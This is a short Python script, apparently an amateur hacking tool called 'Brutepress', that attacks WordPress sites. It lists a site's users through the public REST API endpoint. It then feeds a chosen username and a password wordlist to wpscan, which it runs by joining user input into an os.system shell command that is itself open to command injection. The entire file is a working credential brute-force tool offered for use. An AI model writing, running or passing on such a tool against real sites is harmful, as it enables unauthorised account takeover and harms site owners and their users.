import requests
import os

print("    __               __")                                
print("   / /_  _______  __/ / ___  ____  ________  __________")
print("  / __ \/ ___/ / / / __/ _ \/ __ \/ ___/ _ \/ ___/ ___/")
print(" / /_/ / /  / /_/ / /_/  __/ /_/ / /  /  __(__  |__  )") 
print("/_.___/_/   \__,_/\__/\___/ .___/_/   \___/____/____/")  
print("                         /_/")    

print("                           ")
print("Brutepress v1.0 by NullWin")
print("                           ")

url = str(input("input wordpress site: "))
joint = url + "/wp-json/wp/v2/users"

two = requests.get(joint)
length = len(two.json())


for x in range(length):
    data = two.json()[x]['name']
    print(f"{x} {data}")

number = int(input('select the username:'))
show = two.json()[number]['name']
print(show)

dictpath = str(input("input dictionary path and file: "))

comando = 'wpscan --url '+url+' --passwords '+dictpath+' --usernames '+ show

os.system(comando)
